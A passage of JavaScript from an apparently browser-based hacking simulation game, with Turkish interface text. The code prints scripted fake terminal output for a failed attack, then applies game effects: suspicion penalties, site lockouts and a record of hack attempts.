        success: success,
        day: GameState.get('day'),
        time: GameState.getTimeString(),
        reward: success ? finalReward : 0,
      });
      GameState.set('hackHistory', hackHistory);
      if (GameState.get('suspicion') >= 50) {
        MessengerApp.triggerStoryEvent('highSuspicion');
      }
    }, 1500);
  }
  function simulateFailedIncompatible(attack, site) {
    var $input = $('#terminal-input');
    $input.prop('disabled', true).attr('placeholder', 'saldırı yürütülüyor...');
    
    // Play a brief screen shake to indicate high load/glitch
    setTimeout(function() {
      $('#desktop').addClass('screen-shake');
      setTimeout(function() {
        $('#desktop').removeClass('screen-shake');
      }, 500);
    }, 5000);

    var fakeLines = [
      { t: 0,    text: '', cls: '' },
      { t: 0,    text: '╔════════════════════════════════════════════════╗', cls: 'cmd-warning' },
      { t: 50,   text: '║  ⚡ SIZMA BAŞLATILIYOR: ' + attack.name.padEnd(24) + '║', cls: 'cmd-warning' },
      { t: 100,  text: '║  Hedef : ' + site.padEnd(37) + '║', cls: 'cmd-warning' },
      { t: 150,  text: '╚════════════════════════════════════════════════╝', cls: 'cmd-warning' },
      { t: 600,  text: '▸ Hedef sunucuya bağlantı kuruluyor...', cls: 'cmd-output' },
      { t: 1400, text: '▸ TCP handshake tamamlandı [port 443]', cls: 'cmd-output' },
      { t: 2100, text: '▸ Güvenlik duvarı bypass edildi, tünel açılıyor...', cls: 'cmd-success' },
      { t: 2800, text: '▸ ' + attack.name + ' payload enjekte ediliyor...', cls: 'cmd-success' },
      { t: 3600, text: '▸ Payload başarıyla enjekte edildi! Veritabanı bağlantısı kuruluyor...', cls: 'cmd-success' },
      { t: 4200, text: '▸ Yetki yükseltme (Privilege Escalation) tetiklendi... [ROOT]', cls: 'cmd-success' },
      { t: 4800, text: '▸ SİSTEM VERİLERİ ÇEKİLİYOR... LÜTFEN BEKLEYİN...', cls: 'cmd-info' },
      { t: 5000, text: '  [████████████████████░░] %90', cls: 'cmd-info' },
      { t: 5200, text: '⚠️ CRITICAL WARNING: MEMORY CORRUPTION IN TARGET HOST', cls: 'cmd-warning' },
      { t: 5500, text: '❌ FATAL ERROR: TERMINAL OVERFLOW EXCEPTION (0x0000007B)', cls: 'cmd-error' },
      { t: 5800, text: '  SYSTEM BUFFER CORRUPTED. GLITCHING SHELL DETECTED...', cls: 'cmd-error' },
      { t: 6000, text: '▒▒▒▒▒▒▒ SYSTEM FAILURE ▒▒▒▒▒▒▒', cls: 'cmd-error' },
      { t: 6200, text: '🚨 GÜVENLİK ALARMI: Uyumsuz saldırı tipi hedef sunucu koruma sistemlerini (IDS/WAF) alarma geçirdi!', cls: 'cmd-error' },
      { t: 6500, text: '🚨 İZ KORUMA SEVİYESİ AŞILDI: Saldırı kaynağının konumu deşifre edildi!', cls: 'cmd-error' },
      { t: 6800, text: 'Connection lost. Terminal session closed with error code 139.', cls: 'cmd-error' },
      { t: 7100, text: '  ═══════════════════════════════════════════', cls: 'cmd-error' },
      { t: 7200, text: '  ✗ SALDIRI CRASH VERDİ — Terminal Çöktü!', cls: 'cmd-error' },
      { t: 7300, text: '  ⚠️ Uyumsuz veya kararsız bir exploit denemesi nedeniyle hedef sistem çöktü ve şüphe seviyeniz büyük ölçüde arttı!', cls: 'cmd-warning' },
      { t: 7400, text: '  ℹ️ Hedef zafiyet profili için doğru exploit\'i "scan" komutuyla bulun.', cls: 'cmd-info' },
      { t: 7500, text: '  ═══════════════════════════════════════════', cls: 'cmd-error' },
    ];
    var timers = [];
    fakeLines.forEach(function (line) {
      var tid = setTimeout(function () {
        TerminalApp.printOutput(line.text, line.cls);
      }, line.t);
      timers.push(tid);
    });
    setTimeout(function () {
      // Significantly increase suspicion level on incompatible crash (15% to 25%)
      var glitchPenalty = 15 + Math.floor(Math.random() * 11);
      GameState.addSuspicion(glitchPenalty);
      TerminalApp.printOutput('  🔍 Şüphe Artışı (Uyumsuz Saldırı Cezası): +' + glitchPenalty + '% (toplam: ' + GameState.get('suspicion') + '%)', 'cmd-error');
      TerminalApp.printOutput('', '');
      TimeSystem.advanceTime(Math.round(attack.timeCost * 0.5));
      var siteStates = GameState.get('siteStates') || {};
      if (!siteStates[site]) siteStates[site] = { failedAttempts: 0 };
      siteStates[site].failedAttempts++;
      if (siteStates[site].failedAttempts >= 3) {
        siteStates[site].lockdownUntil = getGameMinutes() + 2880;
        siteStates[site].failedAttempts = 0;
        TerminalApp.printOutput('  🚨 3 başarısız deneme! Site 48 saatliğine LOCKDOWN!', 'cmd-error');
      }
      GameState.set('siteStates', siteStates);
      var hackHistory = GameState.get('hackHistory');
      hackHistory.push({
        type: attack.id,
        name: attack.name,
        target: site,
        success: false,
        day: GameState.get('day'),
        time: GameState.getTimeString(),
        reward: 0,
      });
      GameState.set('hackHistory', hackHistory);
      $input.prop('disabled', false).attr('placeholder', 'komut girin...').focus();
    }, 8000);
  }
  function getAttack(id) {
    return ATTACKS[id] || null;
  }
  function getAttacksByTier(tier) {
    return Object.values(ATTACKS).filter(a => a.tier === tier);
  }
  return {
    executeAttack,
    getAttack,
    getAttacksByTier,
    ATTACKS,
    SITE_PROFILES,
    isInteractiveActive,
    handleInteractiveInput,
  };
})();
